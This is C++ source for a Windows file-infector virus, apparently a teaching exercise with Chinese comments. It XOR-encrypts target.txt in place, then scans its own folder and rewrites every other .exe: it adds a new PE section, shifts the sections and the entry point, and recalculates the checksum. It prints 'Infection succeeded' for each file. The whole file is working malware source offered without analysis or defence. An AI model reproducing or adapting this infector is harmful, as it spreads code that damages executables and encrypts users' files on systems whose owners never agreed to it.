#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <windows.h>
#include <string>
#include <iomanip>
#include <imagehlp.h>
#pragma comment(lib,"imagehlp.lib")

using namespace std;
namespace fs = std::filesystem;

HANDLE hFile;
HANDLE hMapping;
LPVOID pMapping;

// 对指定文件进行异或加密
void xorEncrypt(const string& filePath, char key) {
    ifstream inputFile(filePath, ios::binary);
    if (!inputFile.is_open()) {
        cout << "Unable to open the file!" << endl;
        return;
    }

    vector<char> fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
    inputFile.close();

    for (auto& byte : fileContent) {
        byte ^= key;
    }

    ofstream outputFile(filePath, ios::binary);
    if (!outputFile.is_open()) {
        cout << "Unable to write back!" << endl;
        return;
    }

    outputFile.write(fileContent.data(), fileContent.size());
    outputFile.close();
    cout << "Encryption succeeded!" << endl;
}

// === 修改点 1：增加参数 const string& filename ===
void infectPE(const string& filename) {
    // === 修改点 2：使用传入的 filename ===
    hFile = CreateFileA(filename.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "Failed to open: " << filename << endl;
        return;
    }

    hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0x20000, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }

    pMapping = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0x20000);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + dosheader->e_lfanew);

    DWORD OldSizeOfImage = nt_header->OptionalHeader.SizeOfImage;
    nt_header->OptionalHeader.SizeOfImage += 0x1000;

    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(nt_header);
    DWORD firstPt = firstSection->PointerToRawData;
    DWORD sizeToMove = 0x17000 - firstPt;

    nt_header->OptionalHeader.AddressOfEntryPoint += 0x1000;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header) + i;
        if (strncmp((char*)section->Name, ".bss", 4) != 0) {
            section->VirtualAddress += 0x1000;
            section->PointerToRawData += 0x200;
        }
    }

    memmove((BYTE*)pMapping + firstPt + 0x200, (BYTE*)pMapping + firstPt, sizeToMove);
    memset((BYTE*)pMapping + firstPt, 0, 0x200);

    nt_header->FileHeader.NumberOfSections += 1;
    PIMAGE_SECTION_HEADER newSection = IMAGE_FIRST_SECTION(nt_header) + nt_header->FileHeader.NumberOfSections - 1;
    memcpy(newSection->Name, ".newsec", 8);
    newSection->Misc.VirtualSize = 0x1000;
    newSection->VirtualAddress = OldSizeOfImage;
    newSection->SizeOfRawData = 0x200;
    newSection->PointerToRawData = 0x17000;
    newSection->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;

    // === 修改点 3：校验和计算也用传入的 filename ===
    nt_header->OptionalHeader.CheckSum = 0;
    DWORD HeaderCheckSum = 0, CheckSum = 0;
    MapFileAndCheckSumA(filename.c_str(), &HeaderCheckSum, &CheckSum);
    nt_header->OptionalHeader.CheckSum = CheckSum;

    FlushViewOfFile(pMapping, 0);
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    cout << "Infection succeeded on: " << filename << endl;
}

int main() {
    char ownPath[MAX_PATH];
    GetModuleFileNameA(NULL, ownPath, MAX_PATH);

    string selfDir(ownPath);
    size_t lastSlash = selfDir.find_last_of("/\\");
    if (lastSlash != string::npos) {
        selfDir = selfDir.substr(0, lastSlash);
        SetCurrentDirectoryA(selfDir.c_str());
    }

    string selfName = fs::path(ownPath).filename().string();

    // 加密 target.txt（保持不变）
    xorEncrypt("target.txt", 0x66);

    // === 新增：遍历当前目录所有 .exe 文件 ===
    cout << "Scanning for .exe files in current directory..." << endl;
    for (const auto& entry : fs::directory_iterator(".")) {
        if (entry.is_regular_file() && entry.path().extension() == ".exe") {
            string filename = entry.path().filename().string();

            // 跳过病毒自身，避免自感染
            if (filename == selfName) {
                cout << "Skipping self: " << filename << endl;
                continue;
            }

            cout << "Attempting to infect: " << filename << endl;
            infectPE(filename); // 传入文件名
        }
    }

    return 0;
}